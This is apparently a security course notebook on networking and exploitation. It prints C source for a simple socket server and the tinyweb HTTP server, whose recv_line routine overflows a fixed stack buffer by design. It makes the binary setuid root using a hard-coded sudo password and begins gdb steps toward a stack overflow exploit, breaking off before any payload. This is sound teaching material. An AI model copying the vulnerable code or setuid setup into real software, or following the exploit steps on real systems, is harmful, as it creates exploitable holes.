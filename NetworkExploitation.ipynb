{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Networking\n",
    "- computer networks are so ubiquitous that they're taken for granted\n",
    "- we're constantly connected to Internet and use applications that rely on networking\n",
    "    - email, social media, the Web\n",
    "- these applications rely on a particular network protocol, but each protocol uses the same general network transport methods\n",
    "- there are vulnerabilities in the networking protocols themselves and on systems and applications running on the network"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## OSI Model\n",
    "- Open Systems Interconnection model\n",
    "- governs the language used by systems in the network to talk to each other\n",
    "- the structure of the language is described in 7 layers by the OSI model\n",
    "- the conceptual layers make it easier for different network devices (routers, switches, firewalls) and applications (Web, email) to focus on their respective layers and ignore the others\n",
    "\n",
    "### OSI layers\n",
    "<img src=\"./resources/OSIModel.png\">\n",
    "\n",
    "1. **Physical layer** \n",
    "    - lowest layer that deals with the physical connection between two points\n",
    "    - responsible for activating, maintaining, and deactivating these bit-stream communications\n",
    "    - Ethernet card and cable, WiFi Card belong to this layer\n",
    "- **Data-link layer**\n",
    "    - deals with transferring data providing high-level functions (error correction and flow control)\n",
    "    - provides procedures for activating, maintaining, and deactivating data-link connections\n",
    "    - ARP (Address Resoultion Protocol) is a common protocol that uses this layer\n",
    "    - Ehternet switches are network devices that use Layer 2 protocol\n",
    "- **Network layer**\n",
    "    - works as the middle ground\n",
    "    - primarily role is to pass information between the lower and the higher layers\n",
    "    - provides addressing (IP) and routing between two different networks\n",
    "    - most routers and layer-3 switches are primarily use this layer\n",
    "- **Transport layer**\n",
    "    - provides transparent transfer of data between systems\n",
    "    - provides reliable data communication, so the higher layers do not have to worry about reliability or cost-effectiveness of data transmission\n",
    "    - TCP, UDP and ICMP are commonly used protocols of this layer\n",
    "- **Session layer**\n",
    "    - responsible for establishing and maintaining connections between network applications\n",
    "- **Presentation layer**\n",
    "    - responsible for presenting the data to applications in a syntax or language they understand\n",
    "    - supports things like encryptiong, data compressions, image file (GIF, JPG) etc.\n",
    "- **Application layer**\n",
    "    - the layer users interact with\n",
    "    - concerned with keeping track of the requirements of the application\n",
    "    - HTTP, FTP, SMTP, SSH, Telnet are some protocols used in this layer\n",
    "    \n",
    "### Packet Encapsulation\n",
    "- starting from the application layer, the packet wraps the presentation layer around the data, which wraps the session layer, which wraps the transport layer, and so forth\n",
    "<img src=\"./resources/PacketEncapsulation.png\">\n",
    "\n",
    "## Sockets\n",
    " - standard way to perform network communications through the OS\n",
    " - socket API takes care of OSI details\n",
    " - in C, sockets behave a lot like files where you use read() and write() to receive and send data\n",
    " - /usr/includesys/sockets.h provide a bunch of functions to work with sockets\n",
    " - socket(), connect(), bind(), listen(), accept(), send(), recv()\n",
    " - we'll use Scapy python library to create packets with various protocol types and send across networks\n",
    "     - we'll use these notebooks to learn scapy: https://github.com/rambasnet/ScapyNotebooks\n",
    "     "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## A Simple Server Example\n",
    "- a server that listens for TCP connection on port 7890\n",
    "- when a client connects it sends a message *Hello World!* and receives data until connection is closed\n",
    "- booksrc/simple_server.c and booksrc/hacking.h are the two files required to build the simple server\n",
    "```\n",
    "$ g++ simple_server.c -o simple_server.exe\n",
    "$ ./simple_server.exe\n",
    "$ telnet 127.0.0.1 7890\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./booksrc/simple_server.c .\n",
    "! cp ./booksrc/hacking.h ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "#include <sys/socket.h>\r\n",
      "#include <netinet/in.h>\r\n",
      "#include <arpa/inet.h>\r\n",
      "#include \"hacking.h\"\r\n",
      "\r\n",
      "#define PORT 7890\t// the port users will be connecting to\r\n",
      "\r\n",
      "int main(void) {\r\n",
      "\tint sockfd, new_sockfd;  // listen on sock_fd, new connection on new_fd\r\n",
      "\tstruct sockaddr_in host_addr, client_addr;\t// my address information\r\n",
      "\tsocklen_t sin_size;\r\n",
      "\tint recv_length=1, yes=1;\r\n",
      "\tchar buffer[1024];\r\n",
      "\r\n",
      "\tif ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\r\n",
      "\t\tfatal(\"in socket\");\r\n",
      "\r\n",
      "\tif (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\r\n",
      "\t\tfatal(\"setting socket option SO_REUSEADDR\");\r\n",
      "\t\r\n",
      "\thost_addr.sin_family = AF_INET;\t\t // host byte order\r\n",
      "\thost_addr.sin_port = htons(PORT);\t // short, network byte order\r\n",
      "\thost_addr.sin_addr.s_addr = INADDR_ANY; // automatically fill with my IP\r\n",
      "\tmemset(&(host_addr.sin_zero), '\\0', 8); // zero the rest of the struct\r\n",
      "\r\n",
      "\tif (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)\r\n",
      "\t\tfatal(\"binding to socket\");\r\n",
      "\r\n",
      "\tif (listen(sockfd, 5) == -1)\r\n",
      "\t\tfatal(\"listening on socket\");\r\n",
      "\r\n",
      "\twhile(1) {    // Accept loop\r\n",
      "\t\tsin_size = sizeof(struct sockaddr_in);\r\n",
      "\t\tnew_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\r\n",
      "\t\tif(new_sockfd == -1)\r\n",
      "\t\t\tfatal(\"accepting connection\");\r\n",
      "\t\tprintf(\"server: got connection from %s port %d\\n\",inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));\r\n",
      "\t\tsend(new_sockfd, \"Hello World!\\n\", 13, 0);\r\n",
      "\t\trecv_length = recv(new_sockfd, &buffer, 1024, 0);\r\n",
      "\t\twhile(recv_length > 0) {\r\n",
      "\t\t\tprintf(\"RECV: %d bytes\\n\", recv_length);\r\n",
      "\t\t\tdump(buffer, recv_length);\r\n",
      "\t\t\trecv_length = recv(new_sockfd, &buffer, 1024, 0);\r\n",
      "\t\t}\r\n",
      "\t\tclose(new_sockfd);\r\n",
      "\t}\r\n",
      "\treturn 0;\r\n",
      "}\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "! cat simple_server.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "\r\n",
      "// A function to display an error message and then exit\r\n",
      "void fatal(char *message) {\r\n",
      "   char error_message[100];\r\n",
      "\r\n",
      "   strcpy(error_message, \"[!!] Fatal Error \");\r\n",
      "   strncat(error_message, message, 83);\r\n",
      "   perror(error_message);\r\n",
      "   exit(-1);\r\n",
      "}\r\n",
      "\r\n",
      "// An error checked malloc() wrapper function\r\n",
      "void *ec_malloc(unsigned int size) {\r\n",
      "   void *ptr;\r\n",
      "   ptr = malloc(size);\r\n",
      "   if(ptr == NULL)\r\n",
      "      fatal(\"in ec_malloc() on memory allocation\");\r\n",
      "   return ptr;\r\n",
      "}\r\n",
      "\r\n",
      "// dumps raw memory in hex byte and printable split format\r\n",
      "void dump(const unsigned char *data_buffer, const unsigned int length) {\r\n",
      "\tunsigned char byte;\r\n",
      "\tunsigned int i, j;\r\n",
      "\tfor(i=0; i < length; i++) {\r\n",
      "\t\tbyte = data_buffer[i];\r\n",
      "\t\tprintf(\"%02x \", data_buffer[i]);  // display byte in hex\r\n",
      "\t\tif(((i%16)==15) || (i==length-1)) {\r\n",
      "\t\t\tfor(j=0; j < 15-(i%16); j++)\r\n",
      "\t\t\t\tprintf(\"   \");\r\n",
      "\t\t\tprintf(\"| \");\r\n",
      "\t\t\tfor(j=(i-(i%16)); j <= i; j++) {  // display printable bytes from line\r\n",
      "\t\t\t\tbyte = data_buffer[j];\r\n",
      "\t\t\t\tif((byte > 31) && (byte < 127)) // outside printable char range\r\n",
      "\t\t\t\t\tprintf(\"%c\", byte);\r\n",
      "\t\t\t\telse\r\n",
      "\t\t\t\t\tprintf(\".\");\r\n",
      "\t\t\t}\r\n",
      "\t\t\tprintf(\"\\n\"); // end of the dump line (each line 16 bytes)\r\n",
      "\t\t} // end if\r\n",
      "\t} // end for\r\n",
      "}\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "! cat hacking.h"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[01m\u001b[Ksimple_server.c:\u001b[m\u001b[K In function ‘\u001b[01m\u001b[Kmain\u001b[m\u001b[K’:\n",
      "\u001b[01m\u001b[Ksimple_server.c:48:3:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Kclose\u001b[m\u001b[K’ [-Wimplicit-function-declaration]\n",
      "   close(new_sockfd);\n",
      "\u001b[01;32m\u001b[K   ^\u001b[m\u001b[K\n"
     ]
    }
   ],
   "source": [
    "! ./compile.sh simple_server.c simple_server.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### run  ./simple_server.exe from terminal"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### run telnet 127.0.0.1 7890 from another terminal\n",
    "### run telnet private ip 7890 from another computer in the same network\n",
    "- interact with the server by sending some data\n",
    "- notice 0x0D 0x0A at the end of every data sent\n",
    "- telnet and HTTP protocols expect lines/data to be terminted with these two bytes\n",
    "- when done enter ctrl+] and close command on telnet> prompt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "       Oct   Dec   Hex   Char                        Oct   Dec   Hex   Char\r\n",
      "       012   10    0A    LF  '\\n' (new line)         112   74    4A    J\r\n",
      "       015   13    0D    CR  '\\r' (carriage ret)     115   77    4D    M\r\n"
     ]
    }
   ],
   "source": [
    "! man ascii | egrep \"Hex|0A|0D\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### telnet to webserver\n",
    "- from terminal telnet www.coloradomesa.edu 80\n",
    "- issue HEAD / HTTP/1.0 command and enter twice"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## A Tinyweb Server\n",
    "- similar to simple server but uses HTTP protocol to communicate\n",
    "- source to compile - booksrc/tinyweb.c\n",
    "- handles HTTP GET and HEAD requests\n",
    "- looks for the requested resource in the local directory callled webroot and send it to the browser\n",
    "- if the file can't be found, the server will respond with 404 HTTP (`File Not Found`) response\n",
    "- compile tinyweb.c, setuid as root and run the server\n",
    "- \n",
    "- **Note** Change PORT # to 8080 or something higher if port 80 is being used\n",
    "    - On SEED Lab VM port 80 is used by apache, you can kill the process\n",
    "    ```\n",
    "    $ sudo apache2ctl stop\n",
    "\n",
    "    ```\n",
    "````bash\n",
    "$ compile.sh tinyweb.c tinyweb.exe\n",
    "$ sudo chown root ./tinyweb.exe\n",
    "$ sudo chmod u+s ./tinyweb.exe\n",
    "$ ./tinyweb.exe\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp booksrc/tinyweb.c .\n",
    "! cp booksrc/hacking-network.h .\n",
    "! cp booksrc/hacking.h ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <fcntl.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "#include <sys/stat.h>\r\n",
      "#include <sys/socket.h>\r\n",
      "#include <netinet/in.h>\r\n",
      "#include <arpa/inet.h>\r\n",
      "#include \"hacking.h\"\r\n",
      "#include \"hacking-network.h\"\r\n",
      "\r\n",
      "#define PORT 80   // the port users will be connecting to\r\n",
      "#define WEBROOT \"./webroot\" // the web server's root directory\r\n",
      "\r\n",
      "void handle_connection(int, struct sockaddr_in *); // handle web requests\r\n",
      "int get_file_size(int); // returns the filesize of open file descriptor\r\n",
      "\r\n",
      "int main(void) {\r\n",
      "   int sockfd, new_sockfd, yes=1; \r\n",
      "   struct sockaddr_in host_addr, client_addr;   // my address information\r\n",
      "   socklen_t sin_size;\r\n",
      "\r\n",
      "   printf(\"Accepting web requests on port %d\\n\", PORT);\r\n",
      "\r\n",
      "   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\r\n",
      "      fatal(\"in socket\");\r\n",
      "\r\n",
      "   if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\r\n",
      "      fatal(\"setting socket option SO_REUSEADDR\");\r\n",
      "\r\n",
      "   host_addr.sin_family = AF_INET;      // host byte order\r\n",
      "   host_addr.sin_port = htons(PORT);    // short, network byte order\r\n",
      "   host_addr.sin_addr.s_addr = INADDR_ANY; // automatically fill with my IP\r\n",
      "   memset(&(host_addr.sin_zero), '\\0', 8); // zero the rest of the struct\r\n",
      "\r\n",
      "   if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)\r\n",
      "      fatal(\"binding to socket\");\r\n",
      "\r\n",
      "   if (listen(sockfd, 20) == -1)\r\n",
      "      fatal(\"listening on socket\");\r\n",
      "\r\n",
      "   while(1) {   // Accept loop\r\n",
      "      sin_size = sizeof(struct sockaddr_in);\r\n",
      "      new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\r\n",
      "      if(new_sockfd == -1)\r\n",
      "         fatal(\"accepting connection\");\r\n",
      "\r\n",
      "      handle_connection(new_sockfd, &client_addr);\r\n",
      "   }\r\n",
      "   return 0;\r\n",
      "}\r\n",
      "\r\n",
      "/* This function handles the connection on the passed socket from the\r\n",
      " * passed client address.  The connection is processed as a web request\r\n",
      " * and this function replies over the connected socket.  Finally, the \r\n",
      " * passed socket is closed at the end of the function.\r\n",
      " */\r\n",
      "void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr) {\r\n",
      "   unsigned char *ptr, request[500], resource[500];\r\n",
      "   int fd, length;\r\n",
      "\r\n",
      "   length = recv_line(sockfd, request);\r\n",
      "\r\n",
      "   printf(\"Got request from %s:%d \\\"%s\\\"\\n\", inet_ntoa(client_addr_ptr->sin_addr), ntohs(client_addr_ptr->sin_port), request);\r\n",
      "\r\n",
      "   ptr = strstr(request, \" HTTP/\"); // search for valid looking request\r\n",
      "   if(ptr == NULL) { // then this isn't valid HTTP\r\n",
      "      printf(\" NOT HTTP!\\n\");\r\n",
      "   } else {\r\n",
      "      *ptr = 0; // terminate the buffer at the end of the URL\r\n",
      "      ptr = NULL; // set ptr to NULL (used to flag for an invalid request)\r\n",
      "      if(strncmp(request, \"GET \", 4) == 0)  // get request\r\n",
      "         ptr = request+4; // ptr is the URL\r\n",
      "      if(strncmp(request, \"HEAD \", 5) == 0) // head request\r\n",
      "         ptr = request+5; // ptr is the URL\r\n",
      "\r\n",
      "      if(ptr == NULL) { // then this is not a recognized request\r\n",
      "         printf(\"\\tUNKNOWN REQUEST!\\n\");\r\n",
      "      } else { // valid request, with ptr pointing to the resource name\r\n",
      "         if (ptr[strlen(ptr) - 1] == '/')  // for resources ending with '/'\r\n",
      "            strcat(ptr, \"index.html\");     // add 'index.html' to the end\r\n",
      "         strcpy(resource, WEBROOT);     // begin resource with web root path\r\n",
      "         strcat(resource, ptr);         //  and join it with resource path\r\n",
      "         fd = open(resource, O_RDONLY, 0); // try to open the file\r\n",
      "         printf(\"\\tOpening \\'%s\\'\\t\", resource);\r\n",
      "         if(fd == -1) { // if file is not found\r\n",
      "            printf(\" 404 Not Found\\n\");\r\n",
      "            send_string(sockfd, \"HTTP/1.0 404 NOT FOUND\\r\\n\");\r\n",
      "            send_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\r\n",
      "            send_string(sockfd, \"<html><head><title>404 Not Found</title></head>\");\r\n",
      "            send_string(sockfd, \"<body><h1>URL not found</h1></body></html>\\r\\n\");\r\n",
      "         } else {      // otherwise, serve up the file\r\n",
      "            printf(\" 200 OK\\n\");\r\n",
      "            send_string(sockfd, \"HTTP/1.0 200 OK\\r\\n\");\r\n",
      "            send_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\r\n",
      "            if(ptr == request + 4) { // then this is a GET request\r\n",
      "               if( (length = get_file_size(fd)) == -1)\r\n",
      "                  fatal(\"getting resource file size\");\r\n",
      "               if( (ptr = (unsigned char *) malloc(length)) == NULL)\r\n",
      "                  fatal(\"allocating memory for reading resource\");\r\n",
      "               read(fd, ptr, length); // read the file into memory\r\n",
      "               send(sockfd, ptr, length, 0);  // send it to socket\r\n",
      "               free(ptr); // free file memory\r\n",
      "            }\r\n",
      "            close(fd); // close the file\r\n",
      "         } // end if block for file found/not found\r\n",
      "      } // end if block for valid request\r\n",
      "   } // end if block for valid HTTP\r\n",
      "   shutdown(sockfd, SHUT_RDWR); // close the socket gracefully\r\n",
      "}\r\n",
      "\r\n",
      "/* This function accepts an open file descriptor and returns     \r\n",
      " * the size of the associated file.  Returns -1 on failure.\r\n",
      " */\r\n",
      "int get_file_size(int fd) {\r\n",
      "   struct stat stat_struct;\r\n",
      "\r\n",
      "   if(fstat(fd, &stat_struct) == -1)\r\n",
      "      return -1;\r\n",
      "   return (int) stat_struct.st_size;\r\n",
      "}\r\n"
     ]
    }
   ],
   "source": [
    "! cat tinyweb.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 52\r\n",
      "-rwxr-xr-x 1 user user 46794 Sep 11 13:15 image.jpg\r\n",
      "-rw-r--r-- 1 user user   261 Sep 11 13:15 index.html\r\n"
     ]
    }
   ],
   "source": [
    "! cp -r booksrc/webroot .\n",
    "! ls -l webroot"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\r\n",
      "<head><title>A sample webpage</title></head>\r\n",
      "<body bgcolor=\"#000000\" text=\"#ffffffff\">\r\n",
      "<center>\r\n",
      "<h1>This is a sample webpage</h1>\r\n",
      "...and here is some sample text<br>\r\n",
      "<br>\r\n",
      "..and even a sample image:<br>\r\n",
      "<img src=\"image.jpg\"><br>\r\n",
      "</center>\r\n",
      "</body>\r\n",
      "</html>\r\n"
     ]
    }
   ],
   "source": [
    "! cat webroot/index.html"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/* This function accepts a socket FD and a ptr to the null terminated\r\n",
      " * string to send.  The function will make sure all the bytes of the\r\n",
      " * string are sent.  Returns 1 on success and 0 on failure.\r\n",
      " */\r\n",
      "int send_string(int sockfd, unsigned char *buffer) {\r\n",
      "   int sent_bytes, bytes_to_send;\r\n",
      "   bytes_to_send = strlen(buffer);\r\n",
      "   while(bytes_to_send > 0) {\r\n",
      "      sent_bytes = send(sockfd, buffer, bytes_to_send, 0);\r\n",
      "      if(sent_bytes == -1)\r\n",
      "         return 0; // return 0 on send error\r\n",
      "      bytes_to_send -= sent_bytes;\r\n",
      "      buffer += sent_bytes;\r\n",
      "   }\r\n",
      "   return 1; // return 1 on success\r\n",
      "}\r\n",
      "\r\n",
      "/* This function accepts a socket FD and a ptr to a destination\r\n",
      " * buffer.  It will receive from the socket until the EOL byte\r\n",
      " * sequence in seen.  The EOL bytes are read from the socket, but\r\n",
      " * the destination buffer is terminated before these bytes.\r\n",
      " * Returns the size of the read line (without EOL bytes).\r\n",
      " */\r\n",
      "int recv_line(int sockfd, unsigned char *dest_buffer) {\r\n",
      "#define EOL \"\\r\\n\" // End-Of-Line byte sequence\r\n",
      "#define EOL_SIZE 2\r\n",
      "   unsigned char *ptr;\r\n",
      "   int eol_matched = 0;\r\n",
      "\r\n",
      "   ptr = dest_buffer;\r\n",
      "   while(recv(sockfd, ptr, 1, 0) == 1) { // read a single byte\r\n",
      "      if(*ptr == EOL[eol_matched]) { // does this byte match terminator\r\n",
      "         eol_matched++;\r\n",
      "         if(eol_matched == EOL_SIZE) { // if all bytes match terminator,\r\n",
      "            *(ptr+1-EOL_SIZE) = '\\0'; // terminate the string\r\n",
      "            return strlen(dest_buffer); // return bytes recevied\r\n",
      "         }\r\n",
      "      } else {\r\n",
      "         eol_matched = 0;\r\n",
      "      }   \r\n",
      "      ptr++; // increment the pointer to the next byter;\r\n",
      "   }\r\n",
      "   return 0; // didn't find the end of line characters\r\n",
      "}\r\n",
      "\r\n",
      "\r\n",
      "/* Structure for Ethernet headers */\r\n",
      "#define ETHER_ADDR_LEN 6\r\n",
      "#define ETHER_HDR_LEN 14\r\n",
      "\r\n",
      "struct ether_hdr {\r\n",
      "   unsigned char ether_dest_addr[ETHER_ADDR_LEN]; // Destination MAC address\r\n",
      "   unsigned char ether_src_addr[ETHER_ADDR_LEN];  // Source MAC address\r\n",
      "   unsigned short ether_type; // Type of Ethernet packet\r\n",
      "};\r\n",
      "\r\n",
      "/* Structure for Internet Protocol (IP) headers */\r\n",
      "struct ip_hdr {\r\n",
      "   unsigned char ip_version_and_header_length; // version and header length combined\r\n",
      "   unsigned char ip_tos;          // type of service\r\n",
      "   unsigned short ip_len;         // total length\r\n",
      "   unsigned short ip_id;          // identification number\r\n",
      "   unsigned short ip_frag_offset; // fragment offset and flags\r\n",
      "   unsigned char ip_ttl;          // time to live\r\n",
      "   unsigned char ip_type;         // protocol type\r\n",
      "   unsigned short ip_checksum;    // checksum\r\n",
      "   unsigned int ip_src_addr;      // source IP address\r\n",
      "   unsigned int ip_dest_addr;     // destination IP address\r\n",
      "};\r\n",
      "\r\n",
      "/* Structure for Transmission Control Protocol (TCP) headers */\r\n",
      "struct tcp_hdr {\r\n",
      "   unsigned short tcp_src_port;   // source TCP port\r\n",
      "   unsigned short tcp_dest_port;  // destination TCP port\r\n",
      "   unsigned int tcp_seq;          // TCP sequence number\r\n",
      "   unsigned int tcp_ack;          // TCP acknowledgement number\r\n",
      "   unsigned char reserved:4;      // 4-bits from the 6-bits of reserved space\r\n",
      "   unsigned char tcp_offset:4;    // TCP data offset for little endian host\r\n",
      "   unsigned char tcp_flags;       // TCP flags (and 2-bits from reserved space)\r\n",
      "#define TCP_FIN   0x01\r\n",
      "#define TCP_SYN   0x02\r\n",
      "#define TCP_RST   0x04\r\n",
      "#define TCP_PUSH  0x08\r\n",
      "#define TCP_ACK   0x10\r\n",
      "#define TCP_URG   0x20\r\n",
      "   unsigned short tcp_window;     // TCP window size\r\n",
      "   unsigned short tcp_checksum;   // TCP checksum\r\n",
      "   unsigned short tcp_urgent;     // TCP urgent pointer\r\n",
      "};\r\n"
     ]
    }
   ],
   "source": [
    "! cat hacking-network.h"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[01m\u001b[Ktinyweb.c:\u001b[m\u001b[K In function ‘\u001b[01m\u001b[Khandle_connection\u001b[m\u001b[K’:\r\n",
      "\u001b[01m\u001b[Ktinyweb.c:101:16:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Kread\u001b[m\u001b[K’; did you mean ‘\u001b[01m\u001b[Kfread\u001b[m\u001b[K’? [\u001b[01;35m\u001b[K-Wimplicit-function-declaration\u001b[m\u001b[K]\r\n",
      "                \u001b[01;35m\u001b[Kread\u001b[m\u001b[K(fd, ptr, length); // read the file into memory\r\n",
      "                \u001b[01;35m\u001b[K^~~~\u001b[m\u001b[K\r\n",
      "                \u001b[32m\u001b[Kfread\u001b[m\u001b[K\r\n",
      "\u001b[01m\u001b[Ktinyweb.c:105:13:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[Kimplicit declaration of function ‘\u001b[01m\u001b[Kclose\u001b[m\u001b[K’; did you mean ‘\u001b[01m\u001b[Kpclose\u001b[m\u001b[K’? [\u001b[01;35m\u001b[K-Wimplicit-function-declaration\u001b[m\u001b[K]\r\n",
      "             \u001b[01;35m\u001b[Kclose\u001b[m\u001b[K(fd); // close the file\r\n",
      "             \u001b[01;35m\u001b[K^~~~~\u001b[m\u001b[K\r\n",
      "             \u001b[32m\u001b[Kpclose\u001b[m\u001b[K\r\n"
     ]
    }
   ],
   "source": [
    "! ./compile.sh tinyweb.c tinyweb.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "\r\n",
      "// A function to display an error message and then exit\r\n",
      "void fatal(char *message) {\r\n",
      "   char error_message[100];\r\n",
      "\r\n",
      "   strcpy(error_message, \"[!!] Fatal Error \");\r\n",
      "   strncat(error_message, message, 83);\r\n",
      "   perror(error_message);\r\n",
      "   exit(-1);\r\n",
      "}\r\n",
      "\r\n",
      "// An error checked malloc() wrapper function\r\n",
      "void *ec_malloc(unsigned int size) {\r\n",
      "   void *ptr;\r\n",
      "   ptr = malloc(size);\r\n",
      "   if(ptr == NULL)\r\n",
      "      fatal(\"in ec_malloc() on memory allocation\");\r\n",
      "   return ptr;\r\n",
      "}\r\n",
      "\r\n",
      "// dumps raw memory in hex byte and printable split format\r\n",
      "void dump(const unsigned char *data_buffer, const unsigned int length) {\r\n",
      "\tunsigned char byte;\r\n",
      "\tunsigned int i, j;\r\n",
      "\tfor(i=0; i < length; i++) {\r\n",
      "\t\tbyte = data_buffer[i];\r\n",
      "\t\tprintf(\"%02x \", data_buffer[i]);  // display byte in hex\r\n",
      "\t\tif(((i%16)==15) || (i==length-1)) {\r\n",
      "\t\t\tfor(j=0; j < 15-(i%16); j++)\r\n",
      "\t\t\t\tprintf(\"   \");\r\n",
      "\t\t\tprintf(\"| \");\r\n",
      "\t\t\tfor(j=(i-(i%16)); j <= i; j++) {  // display printable bytes from line\r\n",
      "\t\t\t\tbyte = data_buffer[j];\r\n",
      "\t\t\t\tif((byte > 31) && (byte < 127)) // outside printable char range\r\n",
      "\t\t\t\t\tprintf(\"%c\", byte);\r\n",
      "\t\t\t\telse\r\n",
      "\t\t\t\t\tprintf(\".\");\r\n",
      "\t\t\t}\r\n",
      "\t\t\tprintf(\"\\n\"); // end of the dump line (each line 16 bytes)\r\n",
      "\t\t} // end if\r\n",
      "\t} // end for\r\n",
      "}\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "! cat hacking.h"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for seed: "
     ]
    }
   ],
   "source": [
    "! echo dees | sudo -S chown root:root ./tinyweb.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwxrwxr-x 1 root root 16676 Sep  5 10:27 tinyweb.exe\r\n"
     ]
    }
   ],
   "source": [
    "! ls -al tinyweb.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for seed: "
     ]
    }
   ],
   "source": [
    "! echo dees | sudo -S chmod u+s ./tinyweb.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwsrwxr-x 1 root root 16676 Sep  5 10:27 tinyweb.exe\r\n"
     ]
    }
   ],
   "source": [
    "! ls -al tinyweb.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### run tinyweb.exe from a terminal\n",
    "### open a browser and browse to localhost:8080"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Tinyweb Stack Overflow Exploitation\n",
    "- find overlfow vulnerability\n",
    "- find the return address and offset from request buffer\n",
    "- run the tinyweb.exe and get its process id to attach it to the gdb\n",
    "\n",
    "```\n",
    "$ ps aux | grep tinyweb\n",
    "\n",
    "```\n",
    "\n",
    "- Attach gdb to the tinyweb server\n",
    "\n",
    "```\n",
    "$ sudo gdb -q --pid=[tinywebpid] --symbols=./tinyweb.exe\n",
    "```\n",
    "\n",
    "- use gdb to examine memory and addresses\n",
    "\n",
    "```\n",
    "gdb-peda$ list\n",
    "gdb-peda$ list main\n",
    "gdb-peda$ list 44 # list 10 lines around line #44\n",
    "gdb-peda$ break 62 # break at recv_line function that has overrun issue\n",
    "gdb-peda$ continue\n",
    "make a get request using a terminal or browser to hit the breakpoint\n",
    "gdb-peda$ print request\n",
    "gdb-peda$ print /x &request\n",
    "        Note the beginning address of request variable\n",
    "gdb-peda$ x/10wx request+500 - examine 16 words at request+500 bytes variable in stack - return address must be definitely 500 bytes away from request!\n",
    "gdb-peda$ bt  # gives the return address to main\n",
